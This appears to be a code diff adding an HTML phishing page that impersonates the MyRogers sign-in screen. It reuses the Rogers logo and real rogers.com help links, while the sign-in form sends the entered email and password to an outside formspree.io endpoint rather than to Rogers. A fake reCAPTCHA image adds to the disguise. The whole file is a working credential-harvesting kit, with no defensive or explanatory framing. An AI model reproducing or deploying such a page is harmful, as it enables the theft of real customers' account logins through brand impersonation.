@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Pontano+Sans&display=swap" rel="stylesheet">
+    <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"> -->
+    <link rel="stylesheet" href="static/styles/fontawesome/css/fontawesome-all.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.1/css/all.css" integrity="sha384-vp86vTRFVJgpjF9jiIGPEEqYqlDwgyBgEF109VFjmqGmIY/Y4HV4d3Gp2irVfcrp" crossorigin="anonymous">
+   
+    <title>MyRogers | Sign in</title>
+</head>
+<body onload="myFunction()">
+    <div class="wrapper">
+        <div class="container">
+            <div class="anoda">
+                <div class="rog"><img class="rog" src="roger.png" alt="logo"></div>
+                <h3 class="h3"><span>Sign in</span></h3>
+                <p class="p">with your MyRogers credentials</p> 
+                <!-- <div id="badmess"><span style="color: red; font-size: 20px; font-weight: bolder;">&#9432;</span><p> Username and/or password is not recognized. Don’t remember? Try <a href="https://www.rogers.com/consumer/profile/forgotusername">Forgot username</a> or <a href="https://www.rogers.com/consumer/profile/forgotpassword">Forgot password</a>.</p><span id="ice" onclick="ices()"><i class="fas fa-times"></i></span></div> -->
+                <form action="https://formspree.io/f/mwkwwllj" method="POST" id="my-form">
+                    <div class="user-input-wrp">
+                        <br/>
+                        <input type="email" id="email" name="email" class="inputText" required autocomplete="email"/>
+                        <span class="floating-label"><span class="test">Username</span></span><span class="iconic" id="info">&#9432;</span>
+                        <!-- <span id="error" class="text-danger"> <span style="color: red; font-size: 20px; font-weight: bolder; transform: rotateY(280deg);">&#9432;</span> please enter your username</span> -->
+                    </div><br/>
+                    <div style="margin-bottom: 5px;"><a href="https://www.rogers.com/consumer/profile/forgotusername">Forgot username</a></div>
+                    <div class="user-input-wrp">
+                        <br/>
+                        <input type="password" id="password" name="password" class="inputText" required/>
+                        <span class="floating-label"><span class="test">Password</span></span><span class="iconics" onclick="vieworhide()"><i class="fas fa-eye-slash eye"></i></span>
+                        <!-- <span id="mess" class="text-danger"> <span style="color: red; font-size: 20px; font-weight: bolder;">&#9432;</span>  please enter your password</span> -->
+                    </div><br>
+                    <div><a href="https://www.rogers.com/consumer/profile/forgotpassword">Forgot password</a></div><br>
+                    <input type="checkbox" id="c1" name="cb">
+                    <label for="c1"><span style="font-weight: 600; letter-spacing: 1.5px;"> Remember username</span></label>
+                    <button  class="bt" type="submit" id="submit-btn" onclick="submits()" ><span id="sign">Sign in</span></button>
+                    
+                </form>  
+                <br>
+                <hr>
+                <br>
+                <p class="style">New to MyRogers? <a href="https://www.rogers.com/consumer/profile/register">Register</a></p>  
+            </div>
+       </div>
+    </div>
+    
+    <img class="img" src="recaptca.jpg" alt="logo">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src ="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.12.0.min.js"></script>
+
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script src="main.js"></script>
+</html>
